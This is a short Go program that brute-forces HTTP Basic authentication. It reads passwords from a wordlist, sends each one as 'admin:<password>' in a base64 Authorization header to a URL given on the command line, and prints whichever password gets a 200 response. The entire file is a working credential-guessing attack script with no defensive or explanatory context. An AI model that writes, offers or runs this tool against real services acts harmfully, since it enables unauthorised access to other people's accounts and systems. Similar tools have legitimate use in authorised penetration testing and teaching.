package main

import (
  "net/http"
  "os"
  "fmt"
  "bufio"
  "flag"
  "log"
  b64 "encoding/base64"
)


func main() {
  var wListFlag = flag.String("w", "", "wordlist")
  var urlFlag = flag.String("u","", "url")
  flag.Parse()

  // take wordlist for password and make string admin:pass then b64 encode and send get request with
  // the encoded as the Authorization header.
  wFile, err := os.Open(*wListFlag)
  if err != nil {
    log.Fatal(err)
  }
  defer wFile.Close()


  scanner := bufio.NewScanner(wFile)
  client := &http.Client{}

  for scanner.Scan() {
    
    password := scanner.Text()
    payload := fmt.Sprintf("admin:%s", password)
    payloadenc := b64.StdEncoding.EncodeToString([]byte(payload))
    getHead := fmt.Sprintf("Basic %s", payloadenc)
    
    req, err := http.NewRequest("GET", *urlFlag, nil)
    if err != nil {
      log.Fatal(err)
    }

    req.Header.Add("Authorization", getHead)

    res, err := client.Do(req)
    if err != nil {
      log.Fatal(err)
    }
    defer res.Body.Close()

    if res.StatusCode == 200 {
      fmt.Println("password for admin is: "+ password)
    }

  }
}
  
